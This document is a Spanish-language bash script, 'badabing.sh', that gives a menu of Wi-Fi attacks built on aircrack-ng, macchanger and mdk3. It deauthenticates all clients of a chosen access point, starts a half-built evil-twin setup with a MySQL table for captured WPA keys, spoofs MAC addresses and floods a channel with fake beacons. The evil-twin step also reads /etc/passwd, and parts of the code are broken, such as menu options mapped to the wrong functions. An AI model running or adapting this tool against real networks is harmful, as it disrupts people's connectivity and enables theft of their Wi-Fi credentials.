#!/bin/bash

#Colores

Negro='\033[1;30m'        # Negro
Rojo='\033[1;31m'         # Rojo
Verde='\033[1;32m'        # Verde
Amariilo='\033[1;33m'     # Amarillo
Azul='\033[1;34m'         # Azul
Morado='\033[1;35m'       # Morado
Cyan='\033[1;36m'         # Cyan
Blanco='\033[1;37m'       # Blanco
Nada="\033[0m\e[0m"       # Término de color
clear


banner(){
cat banner.txt
}

## Verificación de root

if [ $(id -u) -ne "0" ]; then
	
	echo -e "${Rojo}Tienes que ser root para ejecutar este script${Nada}"
	echo "Uso: sudo ./badabing.sh" 
	exit

fi

## Bucle para requisitos

requisitos(){
clear
echo "Revisando que las herramientas estén instaladas"
echo "  " 
sleep 1
counter=0
dependencias=(airmon-ng xterm hostapd dnsmasq)
for programa in "${dependencias[@]}"; do 
	if [ "$(command -V $programa 2>/dev/null)" ]; then
		echo -e "${Verde}La herramienta $programa si se encuentra instalada${Nada}"
		let counter+=1
		sleep 0.5
	else 
		echo -e "${Rojo}La herramienta $programa no se encuentra instalada${Nada}"
		exit 1 	

	fi
done 
sleep 1
clear
}

regresarmenu(){
read -p "Quieres realizar otra operación? S/N: " OP
if [ $OP == "S" ]; then
	clear
	menu
else
	echo " "
	echo "Adiós"
	exit

fi
}


## Funciones variadas del script

modomonitor(){

echo " "
echo "Iniciando modo monitor..."
echo " " 
sleep 1
read -p "Es correcta esta tarjeta de red? ($tarjetared) S/N: " TR
if [ $TR == "S" ]; then
	echo " "
	echo "Se procede con la ejecución del modo monitor"
	echo " " 
	sleep 0.5
	sudo airmon-ng start $tarjetared 1>/dev/null
	sleep 3
	echo "Eliminando procesos conflictivos..."
	echo " "
	pkill dhclient && pkill wpa_supplicant
	echo "Ejecutando el check kill de airmon-ng para asegurarse"
	echo " " 
	sudo airmon-ng check kill
	sleep 0.5
	echo -e "${Verde}Todo bien, verifica tu tarjeta de red con el comando iwconfig o ifconfig${Nada}"
	echo " "
       	regresarmenu
	
else
	read -p "Especifica tu tarjeta de red: " nueva
	sleep 0.5
	sudo airmon-ng start $nueva
	sleep 3
	echo "Eliminando procesos conflictivos..."
	pkill dhclient && pkill wpa_supplicant
	sleep 1
	echo -e "${Verde}Todo bien, verifica tu tarjeta de red con el comando iwconfig o ifconfig${Nada}"
	echo " "
	regresarmenu
fi


}

killmonitor(){
echo " "	
echo "Regresando" ${tarjetaredmon} "a su estado original"
	sudo airmon-ng stop $tarjetaredmon
sleep 1
echo "Hecho..."
echo " "
regresarmenu
}

enumclient(){
clear
echo "Escaneando puntos de acceso..."
echo " "
sleep 0.6

sudo xterm -hold -title 'CTRL + C y luego cierra la ventana cuando encuentres tu objetivo' -geometry 107+0+0 -bg '#000000' -fg '#FFFFFF' -e 'airodump-ng -w "usuarios" wlan0mon'


sleep 1

echo "Mostrando APs"  

echo " "

#cat -n usuarios-01.csv | perl -pe 's/((?<=,)|(?<=^)),/ ,/g;' | column -t -s, | awk -F" " '{ if ($19>1) { print } }'

#nmcli dev wifi list ifname wlan0mon

sleep 1

cut -d "," -f 14 usuarios-01.csv | nl -n ln -w 6

echo " " 

read -p "Elige tu punto de acceso: " AP

sleep 2

echo " " 

regex="[a-zA-Z]+"

ESSID=$(sed -n "$AP p" < usuarios-01.csv | awk '{print $19}' | cut -d "," -f1)

if [[ $ESSID =~ ^0|^1|^2|^3|^4|^5|^6|^7|^8|^9 ]]; then
ESSID=$(sed -n "$AP p" < usuarios-01.csv | awk '{print $21}' | cut -d "," -f1)
else
ESSID=$(sed -n "$AP p" < usuarios-01.csv | awk '{print $19}' | cut -d "," -f1)
fi

BSSID=$(sed -n "$AP p" < usuarios-01.csv | awk '{print $1}' | cut -d "," -f1)

CANAL=$(sed -n "$AP p" < usuarios-01.csv | awk '{print $6}' | cut -d "," -f1)


echo "Elegiste: $ESSID"
echo " "
echo "BSSID: $BSSID"
echo " " 
echo "Canal: $CANAL"
echo " "

sleep 1

regresarmenu
}

salir(){
echo " "
echo "Adiós"
exit 0 
}


spoofmac(){
echo " "
echo "Cambiando dirección MAC por una aleatoria..."
echo " "
sleep 1
sudo ifconfig $tarjetaredmon down
sleep 0.5
sudo macchanger -A $tarjetaredmon
sleep 0.5
sudo ifconfig $tarjetaredmon up 
echo " "
echo "Todo bien"
echo " "
regresarmenu 
}

resetmac(){
echo " "
echo "Restaurando dirección MAC por defecto"
echo " " 
sudo ifconfig $tarjetaredmon down
sudo macchanger -p $tarjetaredmon
sudo ifconfig $tarjetaredmon up
echo " "
regresarmenu
}

## Este hay que arreglarlo.
eviltwin(){

read -p "Elija el tiempo de duración en segundos para el ataque (Recomendación: 20 o 0(infinito) ): " duracion

echo " "

echo "Desconectando todos los usuarios del punto de acceso seleccionado ($ESSID)"
sleep 1

sudo xterm -hold -title '' -geometry 107+0+0 -bg '#000000' -fg '#FFFFFF' -e 'aireplay-ng -0 '${duracion}' -e '${ESSID}' -c FF:FF:FF:FF:FF:FF wlan0mon' &

echo "Creando Evil Twin..."


sudo xterm -hold -title 'Creando Evil Twin' -geometry 107+0+800 -bg '#000000' -fg '#FFFFFF' -e 'cat /etc/passwd' 

sudo service mysql start

sudo mysql --execute=CREATE database apfalso; CREATE user usuario; grant all on apfalso.* to 'usuario'@'localhost' identified by '123456'; create table wpa_keys(password1 varchar(30), password2 varchar(30));; alter database apfalso character set 'utf8'

}



arreglar_channel_hopping(){
tarjetaredmon=$(ifconfig | cut -d " " -f 1 | cut -d ":" -f 1 | xargs | awk '{print $3}' 2>/dev/null)
tarjetared=$(iwconfig wlan0 2>/dev/null | cut -d ' ' -f1 | xargs 2>/dev/null)
CANAL=$(sed -n "$AP p" < usuarios-01.csv | awk '{print $6}' | cut -d "," -f1)
echo "Reiniciando tarjeta de red con el canal del punto de acceso seleccionado"
sleep 1 
sudo airmon-ng stop ${tarjetaredmon}
sleep 1
echo "Volviendo a iniciar la tarjeta de red con el canal ${CANAL}" 
sudo airmon-ng start wlan0 ${CANAL}
echo " "
echo "Todo ok..."
echo " "
regresarmenu
}


saturaronda(){
read -p "Ingresa el nombre de los puntos de acceso a g  enerar: " wow
read -p "Ingresa el canal el cual quieres saturar: " ffff
touch redes.txt
for i in $(seq 1 10); do

	echo "${wow}.$i" >> redes.txt

done

sleep 1 

echo "Presiona CTRL + C para detener el ataque"  

mdk3 wlan0mon b -f redes.txt -a -s 1000 -c $ffff
} 


##Función general del script
menu(){
tarjetaredmon=$(ifconfig | cut -d " " -f 1 | cut -d ":" -f 1 | xargs | awk '{print $3}' 2>/dev/null)
tarjetared=$(iwconfig wlan0 2>/dev/null | cut -d ' ' -f1 | xargs 2>/dev/null)
banner
echo " "
if [ "$tarjetared" = "wlan0" ]; then 
	echo "Tu tarjeta de red es: $tarjetared"
       	echo " " 	
elif [ "$tarjetaredmon" = "wlan0mon" ]; then
	echo "Tu tarjeta de red es: $tarjetaredmon"
	echo " " 
else
	echo "Tu tarjeta de red es: ¯\_(ツ)_/¯"
       	echo " " 	
fi
echo "ESSID: ${ESSID}"
echo "BSSID: ${BSSID}"
echo "Canal: ${CANAL}"
echo ""
echo -e "${Rojo}Escoge la operación que deseas realizar:${Nada}\n"
echo "Utilidades:"
echo " "
echo -e "${Azul}[1]${Nada} Iniciar modo monitor y matar procesos conflictivos"
echo -e "${Azul}[2]${Nada} Regresar tarjeta de red a su estado original"
echo -e "${Azul}[3]${Nada} Regresar dirección MAC a su estado original"
echo -e "${Azul}[4]${Nada} Escanear puntos de acceso y seleccionar"
echo -e "${Azul}[5]${Nada} Arreglar problema de channel hopping"
echo -e "${Azul}[6]${Nada} Salir"


echo " " 
echo "Ataques disponibles:"
echo " "
echo -e "${Azul}[7]${Nada} Spoofing dirección MAC aleatoria"
echo -e "${Azul}[8]${Nada} Deautenticar usuarios dentro del punto de acceso seleccionado y crear un Evil Twin"
echo -e "${Azul}[9]${Nada} Saturar espectro de onda en un canal específico"
echo " " 
read -p "Ingresa el número: " eleccion

case $eleccion in

	1)
	modomonitor;;
	2)
	killmonitor;;
	3)
	resetmac;;
	4)
	enumclient;;
	5)
	arreglar_channel_hopping;;
	6)
	salir;;
	7)
	eviltwin;;
	8)
	spoofmac;;
	9)
	saturaronda;;
	*)
	echo " "
	echo -e "${Rojo}Opción inválida, regresando...${Nada}"
	sleep 1
	clear
	menu
	exit;;
esac

}

requisitos
menu 
